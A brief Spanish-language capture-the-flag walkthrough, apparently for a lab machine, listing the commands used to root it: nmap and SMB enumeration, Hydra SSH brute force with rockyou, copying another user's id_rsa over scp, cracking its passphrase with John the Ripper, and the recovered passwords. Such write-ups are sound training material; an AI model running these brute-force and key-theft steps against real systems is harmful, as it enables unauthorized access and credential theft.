

Empezamos con un reconocimiento básico con [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.25.161 -oN ScanPorts.txt`

Descubrimos que están abiertos los puertos `22 SSH`, `80 HTTP`, `139 SAMBA`, `445 SAMBA`, `8080 HTTP`
Utilizamos [[DIRBUSTER]] Para hacer fuzzing de la web y encontramos el directorio `/development/`, que navegando a el encontramos dos archivos `.txt`

Vemos que nos aporta nada interesante así que empezamos a hacer la enumeración de SAMBA con la herramienta [[RPCCLIENT]]
`rpcclient -U "" -N 10.10.25.161`

Al no mostrarnos nada usaremos `enum4linux` para buscar usuarios
Encontramos dos usurario `kay` y `jan` usaremos [[HYDRA]] para hacer fuerza bruta.
`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.25.161`

Nos encuentra la contraseña que es `armando`
Accedemos a la maquina via `SSH`
Obtenemos el fichero de  `id_rsa` de jay utilizando scp.
`scp jan@10.10.25.161:/home/kay/.ssh/id_rsa id_rsa.orig`

Y con [[JOHN THE RIPPER]] lo hasheamos para que sea compatible con [[JOHN THE RIPPER]]
`python /usr/share/john/ssh2john.py id_rsa.orig > id_rsa.hash`

Y ahora con esta herramienta lo usaremos para descifrar el hash y obtener la password del id_rsa
de `kay`
`john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`
La clave es `beeswax`

Ahora desde la maquina que ya teníamos con `SSH` conectamos con `SSH` hacia el usuario `kay`
`ssh -i .ssh/id_rsa kay@10.10.25.161`

Y obtendremos la sesión con el usuario `kay` en su directorio `home` encontramos una contraseña que es la de root.


